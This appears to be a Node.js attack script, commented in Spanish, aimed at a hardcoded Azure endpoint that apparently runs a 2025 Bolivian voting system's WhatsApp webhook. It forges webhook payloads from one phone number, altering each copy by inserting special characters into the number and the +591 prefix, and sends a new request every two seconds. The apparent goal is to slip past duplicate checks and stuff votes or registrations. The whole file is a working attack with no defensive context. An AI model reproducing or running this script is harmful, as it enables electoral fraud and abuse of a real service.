const axios = require('axios');
const readline = require('readline');

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

// Caracteres especiales que podemos usar entre números
const caracteresEntreNumeros = ['~', '$', '+', '-', '*', '/', '.', '?', '¿', '´', 'ç', '!', 'º', '"', '·', '&', '='];

// Símbolos para el prefijo
const signos = ['+', '-', ',', '.', '(', ')', '[', ']', '{', '}', '|', '/'];

// Función para insertar un carácter en una posición específica del número
function insertarCaracter(numero, posicion, caracter) {
    const numeroArray = numero.split('');
    numeroArray.splice(posicion, 0, caracter);
    return numeroArray.join('');
}

// Función para generar todas las variaciones posibles de un número con caracteres
function* generadorPatrones(numero) {
    // 1. Patrones secuenciales (moviendo un carácter por todas las posiciones)
    for (const caracter of caracteresEntreNumeros) {
        for (let pos = 0; pos < numero.length - 1; pos++) {
            yield insertarCaracter(numero, pos + 1, caracter);
        }
    }

    // 2. Patrones aleatorios
    const maxPatronesAleatorios = 1000; // Ajusta según necesidad
    for (let i = 0; i < maxPatronesAleatorios; i++) {
        const caracter = caracteresEntreNumeros[Math.floor(Math.random() * caracteresEntreNumeros.length)];
        const posicion = Math.floor(Math.random() * (numero.length - 1)) + 1;
        yield insertarCaracter(numero, posicion, caracter);
    }
}

function generarPatron(numero, iterador) {
    const prefijo = '591';
    let resultado = '+';
    
    // Generar patrón para el prefijo
    const signosPrefijo = Math.floor(Math.random() * 3);
    for (let i = 0; i < signosPrefijo; i++) {
        resultado += signos[Math.floor(Math.random() * signos.length)];
    }
    
    // Insertar caracteres en el prefijo
    const prefijoModificado = prefijo.split('').join(signos[Math.floor(Math.random() * signos.length)]);
    resultado += prefijoModificado;
    
    // Obtener siguiente patrón del número
    const numeroModificado = iterador.next().value || numero;
    
    resultado += numeroModificado;
    return { patron: resultado, numero: numero };
}

async function hacerSolicitud(url, numeroFijo, iterador) {
    const { patron, numero } = generarPatron(numeroFijo, iterador);
    
    const body = {
        entry: [
            {
                changes: [
                    {
                        value: {
                            messages: [
                                {
                                    from: patron,
                                    text: {
                                        body: "Hola, deseo participar en este proceso democrático porque creo en el cambio. Quiero ejercer mi derecho a votar de manera libre y responsable por el futuro de Bolivia."
                                    }
                                }
                            ]
                        }
                    }
                ]
            }
        ]
    };

    try {
        const response = await axios.post(url, body);
        console.log(`Solicitud exitosa con número ${numero}`);
        console.log('Patrón usado:', patron);
        console.log('Respuesta:', response.data);
        return true;
    } catch (error) {
        console.error(`Error en la solicitud con número ${numero}:`, error.message);
        return false;
    }
}

let contador = 0;

function iniciarProceso(numeroFijo) {
    console.log(`Iniciando solicitudes con el número ${numeroFijo}...`);
    console.log('Presiona Ctrl+C para detener');

    const iterador = generadorPatrones(numeroFijo);

    const intervalo = setInterval(async () => {
        contador++;
        console.log(`\nSolicitud #${contador}`);
        await hacerSolicitud('https://sistemadevotacion2025-gqh8hhatgtgufhab.brazilsouth-01.azurewebsites.net/whatsapp', numeroFijo, iterador);
    }, 2000);

    process.on('SIGINT', () => {
        clearInterval(intervalo);
        console.log(`\nProceso terminado. Se realizaron ${contador} solicitudes.`);
        process.exit();
    });
}

rl.question('Por favor, ingresa el número de teléfono (8 dígitos): ', (numero) => {
    if (numero.length !== 8 || isNaN(numero)) {
        console.log('Error: El número debe tener exactamente 8 dígitos.');
        rl.close();
        process.exit(1);
    }
    
    rl.close();
    iniciarProceso(numero);
});